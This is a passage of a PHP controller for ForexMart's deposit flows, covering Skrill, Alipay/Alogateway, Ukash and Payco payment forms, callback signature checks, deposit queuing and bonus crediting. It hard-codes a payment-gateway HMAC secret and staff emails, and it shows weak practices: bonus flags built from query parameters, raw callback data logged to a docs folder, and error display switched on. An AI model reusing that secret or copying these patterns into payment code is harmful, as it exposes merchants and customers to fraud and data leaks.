                $this->general_model->updatemy('deposit', 'transaction_id', $transId, $data);
            }
        }
        redirect('deposit/hipay');
    }

    public function hipay_cancelled()
    {
        $this->session->set_flashdata('d_hp_status', 'CANCELLED');
        redirect('deposit/hipay');
    }

    public function hipay_error()
    {
        $this->session->set_flashdata('d_hp_status', 'PAYMENT FAILED');
        redirect('deposit/hipay');
    }

    public function skrill()
    {
        if ($this->session->userdata('logged')) {
            if (FXPP::isEUClient()) {
                redirect('deposit');
            }

            $test_accounts = [
                '134362',
                '168643', //MICRO ACCOUNT TEST LORENZ
                '165394', //NON-MICRO ACCOUNT TEST LORENZ
                '184417', //MICRO ACCOUNT TEST LORENZ
                '179369',
                '184450',
                '161934',
                // '135835',
                '183774', //JOY FXPP-8146
                '222125', //JOY FXPP-8262
                '344483', //venus
                '135835', //venus
                '391246', //FXPP-11949: Jenalie
                '400589', //FXPP-12571: Jenalie
            ];

            if ($this->session->userdata('login_type') == 1) {
                $getCur = $this->partners_model->getAccountByUserId($this->session->userdata('user_id'));
                $currency_conv = $getCur['currency'];
                $acc_number = $getCur['reference_num'];
            } else {
                $getCur = $this->account_model->getAccountByUserId($this->session->userdata('user_id'));
                $currency_conv = $getCur['mt_currency_base'];
                $acc_number = $getCur['account_number'];
            }

            $field_value = '';
            if ($_POST) {
                $field_value = [
                    'amount' => $this->input->post('amount', true),
                ];
            }

            $data['amount'] = $this->input->post_get('amount1', true);

            $this->form_validation->set_rules('currency', 'Currency', 'trim|required|xss_clean');
            $this->form_validation->set_rules('amount', 'Deposit amount', "trim|required|deposit_min_amount[$currency_conv]");

            $data['hasError'] = false;
            if ($this->form_validation->run() === false) {
                $data['hasError'] = true;
            }

            // Validation[ Valid account, complete employment details, is supporters accounts] return false or error message
            $data['error_msg'] = $this->updated_deposit_validation($this->session->userdata('user_id'));

            if ($this->form_validation->run() && !$data['error_msg']) {
                if ($this->session->userdata('user_id') == 10293) {
                    $currency = 'EUR';
                } else {
                    $currency = $this->input->post('currency', true);
                }
                $amount = $this->input->post('amount', true);

                /* FXPP-6333
                $isMicro = $this->account_model->isMicro($getCur['user_id']);
                if ($isMicro) {
                $amount /= 100;
                }
                 FXPP-6333 */

                if (in_array($getCur['user_id'], $test_accounts)) {
                    $custom_field = $this->session->userdata('user_id').';'.$this->input->get('bonus').';'.$this->session->userdata('login_type').';'.$this->input->get('addBonus');
                    $data = [
                            'link' => 'https://www.moneybookers.com/app/payment.pl',
                            'pay_to_email' => 'savvas.patsalides@forexmart.com',
                            'transaction_id' => md5(uniqid()),
                            'currency' => $currency,
                            'amount' => $amount,
                            'language' => 'en',
                            'return_url' => site_url().'deposit/skrill?status=success',
                            'cancel_url' => site_url().'deposit/skrillcanceled',
                            'status_url' => site_url().'deposit/skrillstatus/',
                            'detail1_description' => "ForexMart Deposit (Skrill - ['.$acc_number.']",
                            'detail1_text' => 'Deposit',
                            'merchant_fields' => 'user_id',
                            'user_id' => $custom_field,
                        ];
                } else {
                    $custom_field = $this->session->userdata('user_id').';'.$this->input->get('bonus').';'.$this->session->userdata('login_type').';'.$this->input->get('addBonus');

                    $pay_to_email = 'tmsv-skrill@forexmart.com';

                    /* if(!FXPP::isAccountFromEUCountry()){  // FXPP-10007
                        $pay_to_email = "tmsv-skrill@forexmart.com";
                    }else{
                        $pay_to_email = "skrill@forexmart.com";
                    }*/

                    $data = [
                            'link' => 'https://www.moneybookers.com/app/payment.pl',
                            //                    'link'          => "https://sandbox.dev.skrillws.net/app/payment.pl",
                            //                    'pay_to_email' => "savvas.patsalides@forexmart.com",
                            'pay_to_email' => $pay_to_email,
                            'transaction_id' => md5(uniqid()),
                            'currency' => $currency,
                            'amount' => $amount,
                            'language' => 'en',
                            'return_url' => site_url().'deposit/skrill?status=success',
                            'cancel_url' => site_url().'deposit/skrillcanceled',
                            'status_url' => site_url().'deposit/skrillstatus/',
                            'detail1_description' => "ForexMart Deposit (Skrill - ['.$acc_number.']",
                            'detail1_text' => 'Deposit',
                            'merchant_fields' => 'user_id',
                            'user_id' => $custom_field,
                        ];
                }

                $this->load->view('deposits/skrill_payments', $data);
            } else {
                if ($this->session->userdata('login_type') == 1) {
                    $user_status = $this->partners_model->getAccountStatus($this->session->userdata('user_id'));
                } else {
                    $user_status = $this->account_model->getAccountStatus($this->session->userdata('user_id'));
                }

                $data['incomplete'] =$this->account_model->incompleteRegistration($this->session->userdata('user_id')); //$this->incompleteRegistration($this->session->userdata('user_id'));

                //  $data['user_status'] = $user_status;
                $data['non_verified_notice'] =(!$user_status)? $this->non_verified_notice() : false;
                //$data['disabled'] = (!$data['error_msg']) && (!$data['CurPendValidation']['TradeError'] || $ndb_status) ? '' : 'disabled';
                $data['disabled'] = (!$data['error_msg']) ? '' : 'disabled';

                $data['option'] = $this->general_model->selectOptionList(FXPP::getUserAccountCurrencyBase());

                $status = $this->input->get('status');
                if ($status === 'success') {
                    $data['success'] = true;
                } else {
                    $data['success'] = false;
                }

                // Send Failed Deposit Report
                $stat = $this->session->flashdata('skrill_status');
                if (isset($stat)) {
                    if ($stat == 1) {
                        if ($this->session->userdata('login_type') == 1) {
                            $account_detail = $this->partners_model->getAccountByUserId($this->session->userdata('user_id'));
                        } else {
                            $account_detail = $this->account_model->getAccountByUserId($this->session->userdata('user_id'));
                        }
                        $email_details = [
                            'account_number' => $account_detail['account_number'],
                            'type' => 'Skrill',
                            'reason' => 'CANCELLED',
                        ];
                        $this->sendEmailFailedDeposit($email_details);
                    }
                }

                $account = $this->account_model->getAccountNumber($this->session->userdata('user_id'));
                $data['account'] = $account;
                $data['input_account_number'] = FXPP::inputAccountNumberWithBalance2($account['account_number'], $account['currency']);

                $data['field_value'] = $field_value;

                if (IPLoc::Office()) {
                    if (isset($_GET['status']) && $_GET['status'] == 'success') {
                        sleep(1);
                        header('Location: /deposit/skrill');
                    }
                }

                $data['metadata_description'] = 'Provide the necessary information to deposit via Skrill. Request is processed within 24 hours.';
                $this->template->title('ForexMart | Deposit - Skrill')
                    ->set_layout('internal/main')
                    ->prepend_metadata("
                        <script src='".$this->template->Js()."custom-deposit.js'></script>
                                ")
                    ->build('deposits/skrill', $data);
            }
        } else {
            redirect('signout');
        }
    }

    public function alipay()
    {
        redirect(FXPP::loc_url('deposit'));

        if ($this->session->userdata('logged')) {
            $user_id = $this->session->userdata('user_id');

            $data['amount'] = $this->input->post_get('amount1', true);

            $field_value = '';
            if ($_POST['alogatewaydepositform']) {
                $field_value = [
                    'amount' => $this->input->post('amount'),
                    'first_name' => $this->input->post('first_name'),
                    'last_name' => $this->input->post('last_name'),
                     'address1' => $this->input->post('address1'),
                    'city' => $this->input->post('city'),
                    'zip_code' => $this->input->post('zip_code'),
                    'phone' => $this->input->post('phone'),
                ];
            }

            //if ($data['amount'] == null) {
            $this->form_validation->set_rules('amount', 'Deposit amount', 'trim|required|deposit_cup_amt_validation');
            // }

            $this->form_validation->set_rules('first_name', 'First name', 'trim|required|min_length[4]|max_length[30]');
            $this->form_validation->set_rules('last_name', 'Last name', 'trim|required|min_length[4]|max_length[30]');
            $this->form_validation->set_rules('address1', 'Address', 'trim|required|min_length[10]|max_length[50]');
            $this->form_validation->set_rules('city', 'City', 'trim|required|min_length[4]|max_length[30]');
            $this->form_validation->set_rules('zip_code', 'Zip code', 'trim|required|min_length[3]|max_length[10]');
            $this->form_validation->set_rules('phone', 'Phone', 'trim|required|min_length[4]|max_length[13]');

            //Validation for NDB accounts with Bonus Profit
//            $ndb_status = $this->withdraw_model->hasCancelledNDBbonus($this->session->userdata('user_id'));
//            $hasInNdbBonus = $this->NodepositBonusValidation($this->session->userdata('user_id'));
//            if ($hasInNdbBonus == 2) { //has Ndb Bonus
//                $data['CurPendValidation'] = $this->CurrentAndPendingTradesValidation();//returns false if no open trades
//            }

            $data['error_msg'] = $this->updated_deposit_validation($this->session->userdata('user_id'));

            if ($this->form_validation->run() && !$data['error_msg']) {
                if ($user = $this->general_model->showssingle($table = 'users', 'id', $user_id, 'email,created')) {
                    $amount = ($this->input->post('amount', true) * 100);

                    $date = new DateTime();
                    $order_number = $date->getTimestamp();
                    $order_id = uniqid();

                    $data['all_data'] = [
                        'apiversion' => 3,
                        'version' => 11,
                        'merchant_account' => 900895,
                        'merchant_order' => $order_id,
                        'merchant_product_desc' => 'Alipay Deposit',
                        'first_name' => $this->input->post('first_name', true),
                        'last_name' => $this->input->post('last_name', true),
                        'address1' => $this->input->post('address1', true),
                        'city' => $this->input->post('city', true),
                        'zip_code' => $this->input->post('zip_code', true),
                        'country' => 'CN',
                        'phone' => $this->input->post('phone', true),
                        'email' => $user['email'],
                        'amount' => $amount,  //cny 100.00
                        'currency' => 'CNY',
                        'bankcode' => 'ALIPAY',
                        'ipaddress' => $this->input->ip_address(),
                        'return_url' => 'https://my.forexmart.com/deposit/alipay-return',
                        'server_return_url' => 'https://my.forexmart.com/deposit/alipay_status',
                    ];

                    $insert_data = [
                        'merchant_order' => $data['all_data']['merchant_order'],
                        'first_name' => $this->input->post('first_name', true),
                        'last_name' => $this->input->post('last_name', true),
                        'address1' => $this->input->post('address1', true),
                        'city' => $this->input->post('city', true),
                        'zip_code' => $this->input->post('zip_code', true),
                        'country' => 'CN',
                        'phone' => $this->input->post('phone', true),
                        'email' => $user['email'],
                        'amount' => $amount,
                        'user_id' => $user_id,
                        'create_date' => date('Y-m-d H:i:s'),
                    ];

                    $this->general_model->insertmy('alipay_info', $insert_data);

                    $data['control'] = '21bf90e217f08b8361bf3d7c28144f94';
                    $data['action_link'] = 'https://payment.cdc.alogateway.co/ChinaDebitCard';

                    $concat = $data['all_data']['merchant_account'].$data['all_data']['amount'].$data['all_data']['currency'].$data['all_data']['first_name'].$data['all_data']['last_name'].
                        $data['all_data']['address1'].$data['all_data']['city'].$data['all_data']['zip_code'].$data['all_data']['country'].$data['all_data']['phone'].$data['all_data']['email'].
                        $data['all_data']['merchant_order'].$data['all_data']['merchant_product_desc'].$data['all_data']['return_url'];

                    $checksum = hash_hmac('SHA1', $concat, $data['control']);
                    $data['checksum'] = $checksum;

                    $this->session->set_userdata('sesson_post_data', $field_value);

                    $this->load->view('deposits/alogateway_payment', $data);
                }
            } else {
                $user_status = $this->account_model->getAccountStatus($this->session->userdata('user_id'));
                $data['incomplete'] = $this->account_model->incompleteRegistration($this->session->userdata('user_id'));
                // $data['user_status'] = $user_status;
                $data['non_verified_notice'] = (!$user_status) ? $this->non_verified_notice() : false;
                $data['disabled'] = !$data['error_msg'] ? '' : 'disabled';

                $status = $this->input->get('status', true);
                $data['status'] = $status;
                if ($status === 'success') {
                    $data['success'] = true;
                } else {
                    $data['success'] = false;
                }

                $data['field_value'] = $field_value;
                $account = $this->account_model->getAccountNumber($this->session->userdata('user_id'));
                $data['account'] = $account;
                $data['input_account_number'] = FXPP::inputAccountNumberWithBalance2($account['account_number'], $account['currency']);

                $data['metadata_description'] = 'Alipay';
                $this->template->title('ForexMart | Deposit - Alipay')
                    ->set_layout('internal/main')
                    ->prepend_metadata("<script src='".$this->template->Js()."custom-deposit.js'></script>")
                    ->build('deposits/alogateway', $data);
            }
        } else {
            redirect('signout');
        }
    }

    public function alipay_return()
    {
        $alipayData = $_POST;

        $control = $alipayData['transactionid'].$alipayData['merchant_order'].$alipayData['amount'].$alipayData['currency'].$alipayData['bank_transactionid'].$alipayData['status'];
        $control = hash_hmac('sha1', $control, '21bf90e217f08b8361bf3d7c28144f94');

        if ($alipayData['status'] == 'A0' && $control == $alipayData['control']) {
            $mgs_dpo = 'You have successfully deposited '.$alipayData['amount'].' '.$alipayData['currency'].'. Your transaction id is '.$alipayData['transaction_id'];

            $show_mgs = [
                  'status' => 'success',
                  'data' => $mgs_dpo,
              ];
        } else {
            $mgs_dpo = 'Your transaction is failed, it cannot be completed !';

            $show_mgs = [
                  'status' => 'danger',
                  'data' => $mgs_dpo,
              ];
        }

        $this->session->set_flashdata('msg', $show_mgs);

        redirect('deposit/alipay/');
    }

    public function skrillcanceled()
    {
        $this->session->set_flashdata('skrill_status', 1);
        redirect('deposit/skrill');
    }

    public function skrillstatus()
    {
        $response = '';
        foreach ($_POST as $key => $value) {
            //$value = urlencode(stripslashes($value));
            $response .= $key.' = '.$value.'<br/>';
        }

        $md5Sig = $this->input->post('md5sig', true);
        $merchant_id = $this->input->post('merchant_id', true);
        $transaction_id = $this->input->post('transaction_id', true);
        $mb_transaction_id = $this->input->post('mb_transaction_id', true);
        $mb_amount = $this->input->post('mb_amount', true);
        $mb_currency = $this->input->post('mb_currency', true);
        $amount = $this->input->post('amount', true);
        $currency = $this->input->post('currency', true);
        $status = $this->input->post('status', true);
        $custom_field = $this->input->post('user_id', true);
        $custom_result = explode(';', $custom_field);
        $user_id = $custom_result[0];
        $signature = strtoupper(md5($merchant_id.$transaction_id.strtoupper(md5($this->skrill_secret_key)).$mb_amount.$mb_currency.$status));
        $date = new DateTime();
        $order_number = $date->getTimestamp();

        //Insert skrill Response
        $responsedata = [
            'response' => json_encode($_POST),
            'user_id' => $user_id,
        ];
        $this->deposit_model->insertpaymentResponse('skrill_response', $responsedata);
        //end

        /* FXPP-6333 */
        $currencyStatus = $this->currency_status[$currency];
        $isMicro = $this->account_model->isMicro($user_id);
        if ($isMicro) {
            $amount *= 100;
            $currencyStatus = $this->currency_status['Cents'];
        }
        /* FXPP-6333 */

        if ($md5Sig === $signature) {
//            if (!$this->deposit_model->checkTransactionExist($transaction_id, 'SKRILL')) {
            $conv_amount = $this->get_convert_amount($currency, $amount);

            $payment_data = [
                'transaction_id' => $mb_transaction_id,
                'reference_id' => $order_number,
                'status' => $this->skrill_status[$status],
                'amount' => $amount,
                'currency' => $currency,
                'user_id' => $user_id,
                'payment_date' => date('Y-m-d H:i:s', strtotime(FXPP::getCurrentDateTime())),
                'note' => $signature,
                'transaction_type' => 'SKRILL',
                'conv_amount' => $conv_amount,
            ];

//            $additional_bonus = $this->validateAdditionalBonus($custom_result[3]);

            $additional_bonus = $custom_result[3];

            if ($additional_bonus) {
                $payment_data['tenpercentbonus'] = 1;
            }

            if ($custom_result[1] == 'twpb') {
                $payment_data['twentypercentbonus'] = 1;
            }

            if ($custom_result[1] == 'tpb') {
                $payment_data['thirtypercentbonus'] = 1;
            }
            if ($custom_result[1] == 'fpb') {
                $payment_data['fiftypercentbonus'] = 1;
            }
            if ($custom_result[1] == 'hpb') {
                $payment_data['hundredpercentbonus'] = 1;
            }

//             if($custom_result[1] == 'tenpb') {
//                $payment_data['tenpercentbonus'] = 1;
//            }
            // if ($custom_result[1] == 'rhpb') {
            //     $payment_data['hundred_percent_constant_bonus'] = 1;
            // }

            /*Duplicate validation check*/
            // save only one unique transaction id in the deposit_queue table
            $condition = [
                'transaction_id' => $payment_data['transaction_id'],
                'transaction_type' => 'SKRILL',
            ];
            if ($this->general_model->whereCondition('deposit_queue', $condition)) {
            } else {
                $IsInsertedPaymentQueue = $this->deposit_model->insertPaymentQueue($payment_data);
            }

            if (!$IsInsertedPaymentQueue) {
                $asset_user_docs=$this->config->item('asset_user_docs');
                file_put_contents($asset_user_docs.'skrill.log', $response.PHP_EOL, FILE_APPEND);
            } else {
                $payment_queue = $this->deposit_model->getPaymentQuequeByTranType('SKRILL');
                foreach ($payment_queue as $key => $payment) {
                    if ($this->deposit_model->isExistTransaction($payment['transaction_id'], 'SKRILL') == 0) {
                        if (!$this->deposit_model->checkTransactionExist($payment['transaction_id'], 'SKRILL')) {
                            $fee = 0;
                            $conv_amount_fee = 0;
                            $amount = $payment['amount'];
                            if ($payment['status'] == 2) {
                                $fee = $amount * 0.035;
                                $conv_amount_fee = $this->get_convert_amount($payment['currency'], $fee);
                                $amount -= $fee;
                            }
                            $conv_amount = $this->get_convert_amount($currency, $amount);

                            $insertDepositFailed = [
                                'transaction_id	' => $payment['transaction_id'],
                                'status	' => $payment['status'],
                                'amount	' => $payment['amount'],
                                'currency' => $payment['currency'],
                                'user_id' => $payment['user_id'],
                                'payment_date' => date('Y-m-d H:i:s', strtotime(FXPP::getCurrentDateTime())),
                                'transaction_type' => 'SKRILL',
                                'payment_status' => $this->paymentType_status['Deposit via Skrill'], //FXPP-7618
                                'currency_status' => $currencyStatus, //FXPP-761
                                'fee' => $fee,
                                'isFailed' => 0,
                                'type' => 'deposit-'.$isMicro.'-'.$custom_result[1],
                            ];

                            $data = [
                                'transaction_id' => $payment['transaction_id'],
                                'reference_id' => $payment['reference_id'],
                                'status' => $payment['status'],
                                'amount' => $amount,
                                'currency' => $payment['currency'],
                                'user_id' => $payment['user_id'],
                                'payment_date' => $payment['payment_date'],
                                'note' => $payment['note'],
                                'transaction_type' => 'SKRILL',
                                'conv_amount' => $conv_amount,
                            ];

                            if ($fee > 0) {
                                $data_fee = [
                                    'transaction_id' => $payment['transaction_id'],
                                    'reference_id' => $payment['reference_id'],
                                    'status' => $payment['status'],
                                    'amount' => $fee,
                                    'currency' => $payment['currency'],
                                    'user_id' => $payment['user_id'],
                                    'payment_date' => $payment['payment_date'],
                                    'note' => $payment['note'],
                                    'transaction_type' => 'SKRILL',
                                    'conv_amount' => $conv_amount_fee,
                                ];
                            }

                            $config = [
                                'server' => 'live_new',
                            ];
                            $isbonusten = false;
                            $isbonustwenty = false;
                            $isbonusthirty = false;
                            $isbonusfifty = false;
                            $isbonushundred = false;
                            // $isbonushundredconstant = false;
//                        if ($custom_result[2] == 1) {

                            // inititaisation for the deposit queue user id
                            $user_id = $payment['user_id'];
                            $account = $this->partners_model->getAccountByUserId($payment['user_id']);
                            if ($account) {
                                $account['account_number'] = $account['reference_num'];
                            } else {
                                $account = $this->account_model->getAccountByUserId($payment['user_id']);
                            }

                            $isInsertPayment = false;

                            if ($payment['status'] == 2) {  // save only processed transaction id in deposit table
//                                $WebService = new WebService($config);
                                $account_number = $account['account_number'];

                                // if(IPLoc::APIUpgradeDevIP()){
                                $WebServiceNew = FXPP::DepositRealFund($account_number, $amount, $this->comment_type['deposit'].$this->comment_transaction_type['SKRILL'].$payment['transaction_id']);
                                $requestResult = $WebServiceNew['requestResult'];
                                $ticket = $WebServiceNew['ticket'];
                                /* }else{
                                     $WebService->update_live_deposit_balance($account_number, $amount, $this->comment_type['deposit'] . $this->comment_transaction_type['SKRILL'] . $payment['transaction_id']);
                                     $requestResult = $WebService->request_status;
                                     $ticket        = $WebService->get_result('Ticket');
                                 }*/

                                if ($requestResult === 'RET_OK') {
                                    $data['mt_ticket'] = $ticket;
                                    $isInsertPayment = $this->deposit_model->insertPayment($data);

                                    // Back Agent of Client

                                    $totalAmount = $amount + $fee;
                                    
                                    if ($payment['tenpercentbonus'] == 1) {
                                        $isbonusten = true;
                                     
                                        self::applyDepositBonus($user_id, $account_number, $totalAmount, 'skrill', 'tenpb', $payment['transaction_id'], true);
                                    }

                                    if ($payment['twentypercentbonus'] == 1) {
                                        $isbonustwenty = true;
                                        self::applyDepositBonus($user_id, $account['account_number'], $totalAmount, 'skrill', 'twpb', $payment['transaction_id'], false);
                                    }

                                    if ($payment['thirtypercentbonus'] == 1) {
                                        $isbonusthirty = true;
                                    }
                                    if ($payment['fiftypercentbonus'] == 1) {
                                        $isbonusfifty = true;
                                    }
                                    if ($payment['hundredpercentbonus'] == 1) {
                                        $isbonushundred = true;
                                    }

                                    // if ($payment['hundred_percent_constant_bonus'] == 1) {
                                    //     $isbonushundredconstant = true;
                                    // }
                                   // FXPP::BackAgentOfAccount($account_number);
                                } else {
                                    $insertDepositFailed['comment'] = $requestResult;
                                    $this->general_model->insert('no_status_transaction', $insertDepositFailed);
                                }

                                if ($fee > 0) {
//                                    $WebService = new WebService($config);
                                    $account_number = $account['account_number'];

                                    // if(IPLoc::APIUpgradeDevIP()){
                                    $WebServiceNew = FXPP::DepositRealFund($account_number, $fee, $this->comment_type['deposit_fee'].$this->comment_transaction_type['SKRILL'].$payment['transaction_id']);
                                    $requestResult = $WebServiceNew['requestResult'];
                                    $ticket = $WebServiceNew['ticket'];
                                    /* }else{
                                         $WebService->update_live_deposit_balance($account_number, $fee, $this->comment_type['deposit_fee'] . $this->comment_transaction_type['SKRILL'] . $payment['transaction_id']);
                                         $requestResult = $WebService->request_status;
                                         $ticket        = $WebService->get_result('Ticket');
                                     }*/

                                    if ($requestResult === 'RET_OK') {
                                        $data_fee['mt_ticket'] = $ticket;
                                        $isInsertPaymentFee = $this->deposit_model->insertPayment($data_fee);
                                    } else {
                                        $insertDepositFailed['comment'] = $requestResult;
                                        $this->general_model->insert('no_status_transaction', $insertDepositFailed);
                                    }
                                }

                               /* $bonuses = FXPP::getAccountBonusByType($account_number);
                                $totalskrillAmount = $amount + $fee;
                                $RequestLogintype = $this->account_model->getAccountLoginType($user_id);
                                if ($RequestLogintype['login_type'] != 1) {
                                    if ($totalskrillAmount > 0 and $bonuses[2] > 0) {
                                        FXPP::BonusProfitCancellation($user_id, $account_number, $totalskrillAmount, $payment['transaction_id']);
                                    }
                                }


                                $ndbProfitLogs = [
                                    'Account_number' => $account_number,
                                    'DepAmount' => $totalskrillAmount,
                                    'UserId' => $user_id,
                                    'TransactionId' => $payment['transaction_id'],
                                    'ndbbonus' => $bonuses[2],
                                ];
                                $encodeNdbProfitLogs = json_encode($ndbProfitLogs);
                                $insertProfitLogs = [
                                    'logs' => $encodeNdbProfitLogs,
                                    'User_Id' => $user_id,
                                ];

                                $this->deposit_model->insertNdbCancellationLogs($insertProfitLogs);
                                */

                                $processed_amount = floatval($conv_amount) + floatval($conv_amount_fee);
                                /**  Use original amount for Cent accounts**/
                                $isMicro = $this->account_model->isMicro($user_id);
                                if ($isMicro) {
                                    $processed_amount /= 100;
                                }
                                /**End**/

                                /* Send successful email deposit to auto-reports **/
                                $this->sendEmailAfterSuccessDeposit('Skrill', $processed_amount, $account_number, $user_id, $this->comment_type['deposit'].$this->comment_transaction_type['SKRILL'].$payment['transaction_id']);
                            /* End **/
                            } else { // save pending transaction on skrill_pending_transaction table
                                $this->deposit_model->insertPayment_v3('skrill_pending_transaction', $data);
                                // Send Failed Deposit Report
                                $checkSkrillReport = $this->g_m->showssingle($table = 'skrill_pending_transaction', 'transaction_id', $payment['transaction_id'], '*', '');
                                if (!$checkSkrillReport) {
                                    $code = $this->input->post('failed_reason_code', true);
                                    $email_details = [
                                        'account_number' => $account['account_number'],
                                        'type' => 'Skrill',
                                        'reason' => $this->skrillFailedReasonCodes($code),
                                        'transaction_id' => 'transaction_id: '.$payment['transaction_id'].' status: '.$payment['status'],
                                    ];
                                    $this->sendEmailFailedDeposit($email_details);

                                    if ($code != -1 && $code != 0) { //not pending and cancelled
                                        FXPP::failedPaymentNotify('skrill', 1, $user_id, $this->skrillFailedReasonCodes($code)); //FXPP-9628

                                        if (IPLoc::APIUpgradeDevIP()) {
                                            $sendPending = [
                                                'account_number' => $account['account_number'],
                                                'time' => $payment_data['payment_date'],
                                                'payment_type' => 'Skrill',
                                                'amount' => $payment_data['amount'].' '.$payment_data['currency'],
                                                'transaction_id' => $payment['transaction_id'],
                                            ];

                                            $this->load->library('Fx_mailer');
                                            Fx_mailer::pending_deposit_with_issues($sendPending, 'forexmart.tester5@gmail.com');
                                            Fx_mailer::pending_deposit_with_issues($sendPending, 'agus@forexmart.com');
//                                            Fx_mailer::pending_deposit_with_issues($data, "finance@forexmart.com");
                                        }
                                    }

                                    if ($code == 0) { //FXPP-12707
                                        $sendPending = [
                                            'account_number' => $account['account_number'],
                                            'time' => $payment_data['payment_date'],
                                            'payment_type' => 'Skrill',
                                            'amount' => $payment_data['amount'].' '.$payment_data['currency'],
                                            'transaction_id' => $payment['transaction_id'],
                                        ];

                                        if (IPLoc::APIUpgradeDevIP()) {
                                            $this->load->library('Fx_mailer');
                                            Fx_mailer::pending_deposit_with_issues($sendPending, 'forexmart.tester5@gmail.com');
                                            Fx_mailer::pending_deposit_with_issues($sendPending, 'agus@forexmart.com');
//                                        Fx_mailer::pending_deposit_with_issues($sendPending, "finance@forexmart.com");
                                        }
                                    }
                                }
                            }

                            if (!$isInsertPaymentFee) {
                                $asset_user_docs=$this->config->item('asset_user_docs');
                                file_put_contents($asset_user_docs.'skrill.log', $response.PHP_EOL, FILE_APPEND);
                            }

                            if (!$isInsertPayment) {
                                $asset_user_docs=$this->config->item('asset_user_docs');
                                file_put_contents($asset_user_docs.'skrill.log', $response.PHP_EOL, FILE_APPEND);
                            } else {
//                                FXPP::updateAccountTradingStatus($account['account_number'],$user_id); // for pro accounts

                                /* if(IPLoc::APIUpgradeDevIP()){
                                     FXPP::updateAccountTradingStatusV2($account['account_number'],$user_id); // for pro accounts
                                 }else{*/
                                FXPP::updateAccountTradingStatus($account['account_number'], $user_id, $totalAmount); // for pro accounts
                                // }

                                $totalAmount = $amount + $fee;

//                                if ($isbonusten) {
////                                    FXPP::DepositBonus($user_id, $account['account_number'], $totalAmount, 'skrill', 'tenpb', $payment['transaction_id']);
//                                    self::applyDepositBonus($user_id, $account['account_number'], $totalAmount, 'skrill', 'tenpb', $payment['transaction_id'], true);
//                                }

                                if ($isbonustwenty == true) {
//                                    FXPP::DepositBonus($user_id, $account['account_number'], $totalAmount, 'skrill', 'twpb', $payment['transaction_id']);
//                                    self::applyDepositBonus($user_id, $account['account_number'], $totalAmount, 'skrill', 'twpb', $payment['transaction_id'], false);
                                }

                                if ($isbonusthirty == true) {
//                                    FXPP::DepositBonus($user_id, $account['account_number'], $totalAmount, 'skrill', 'tpb', $payment['transaction_id']);
                                    self::applyDepositBonus($user_id, $account['account_number'], $totalAmount, 'skrill', 'tpb', $payment['transaction_id'], false);
                                }
                                if ($isbonusfifty == true) {
//                                    FXPP::DepositBonus($user_id, $account['account_number'], $totalAmount, 'skrill', 'fpb', $payment['transaction_id']);
                                    self::applyDepositBonus($user_id, $account['account_number'], $totalAmount, 'skrill', 'fpb', $payment['transaction_id'], false);
                                }
                                if ($isbonushundred == true) {
//                                    FXPP::Deposit100PercentBonus($user_id, $account['account_number'], $totalAmount, 'skrill', 'hplb', $payment['transaction_id']);
                                    self::applyDepositBonus($user_id, $account['account_number'], $totalAmount, 'skrill', 'hplb', $payment['transaction_id'], false);
                                }
                                // if($isbonushundredconstant == true){
                                //      FXPP::DepositRegular100PercentBonus($user_id, $account['account_number'], $totalAmount, 'skrill', 'rhpb', $payment['transaction_id']);
                                // }

                            }
                        }
                    }
                }
            }
//        }
        } else {
            $asset_user_docs=$this->config->item('asset_user_docs');
            file_put_contents($asset_user_docs.'paxum.log', $response.PHP_EOL, FILE_APPEND);
        }
    }

    public function skrillFailedReasonCodes($code)
    {
        switch ($code) {
            case -3:
                $desc = 'Chargeback';
                break;
            case -1:
                $desc = 'Canceled';
                break;
            case 0:
                $desc = 'Pending';
                break;
            case 1:
                $desc = 'Referred by Card Issuer';
                break;
            case 2:
                $desc = 'Invalid Merchant';
                break;
            case 3:
                $desc = 'Pick�?up card';
                break;
            case 4:
                $desc = 'Declined by Card Issuer';
                break;
            case 5:
                $desc = 'Insufficient funds';
                break;
            case 6:
                $desc = 'Transaction failed';
                break;
            case 7:
                $desc = 'Incorrect PIN';
                break;
            case 8:
                $desc = 'PIN tries exceed �? card blocked';
                break;
            case 9:
                $desc = 'Invalid Transaction';
                break;
            case 10:
                $desc = 'Transaction frequency limit exceeded';
                break;
            case 11:
                $desc = 'Invalid Amount/ Amount too high /Limit Exceeded';
                break;
            case 12:
                $desc = 'Invalid credit card or bank account';
                break;
            case 13:
                $desc = 'Invalid card Issuer';
                break;
            case 15:
                $desc = 'Duplicate transaction';
                break;
            case 19:
                $desc = 'Retry transaction';
                break;
            case 24:
                $desc = 'Card expired';
                break;
            case 27:
                $desc = 'Requested function not available';
                break;
            case 28:
                $desc = 'Lost/stolen card';
                break;
            case 30:
                $desc = 'Format Failure';
                break;
            case 32:
                $desc = 'Card Security Code (CVV2/CVC2) Check Failed';
                break;
            case 34:
                $desc = 'Illegal Transaction';
                break;
            case 37:
                $desc = 'Card restricted by Card Issuer';
                break;
            case 38:
                $desc = 'Security violation';
                break;
            case 42:
                $desc = 'Card blocked by Card Issuer';
                break;
            case 44:
                $desc = 'Card Issuing Bank or Network is not available';
                break;
            case 45:
                $desc = 'Processing error �? card type is not processed by the authorization centre';
                break;
            case 51:
                $desc = 'System error';
                break;
            case 58:
                $desc = 'Transaction not permitted by acquirer';
                break;
            case 63:
                $desc = 'Transaction not permitted for cardholder';
                break;
            case 70:
                $desc = 'Customer failed 3DS verification';
                break;
            case 80:
                $desc = 'Fraud rules declined';
                break;
            case 98:
                $desc = 'Error in communication with provider';
                break;
            case 99:
                $desc = 'Other';
                break;
            default:
                $desc = 'Failed. No specific details.';
        }

        return $desc;
    }

    public function ukash()
    {
        if ($this->session->userdata('logged')) {
            FXPP::LoginTypeRestriction();
            $user_status = $this->account_model->getAccountStatus($this->session->userdata('user_id'));
            $data['disable_input'] = $user_status;
            $js = $this->template->Js();
            $data['metadata_description'] = 'Provide the necessary information to deposit via Paxum. Request is processed within 7 working hours.';
            $this->template->title('ForexMart | Deposit - Ukash')
                ->set_layout('internal/main')
                ->prepend_metadata("
                    <script src='".$js."custom-deposit.js'></script>
                            ")
                ->build('deposits/ukash', $data);
        } else {
            redirect('signout');
        }
    }

    public function minimumvalue($str)
    {
        if ($str <= 1) {
            $this->form_validation->set_message('minimumvalue', ' %s must be greater than 1.');

            return false;
        } else {
            return true;
        }
    }

    public function payco($arg = null)
    {
//        $this->load->library('IPLoc', null);
//        if(!IPLoc::Office()){
//            redirect('');
//        }
        $this->lang->load('deposit');
        error_reporting(E_ALL);
        ini_set('display_errors', 1);
        if ($this->session->userdata('logged')) {
            // if(FXPP::isEUClient()){redirect('deposit');}
            // if(!IPLoc::office()){
            // FXPP::LoginTypeRestriction();
            // }

            $walletCurrency = $this->input->post('currency', true);
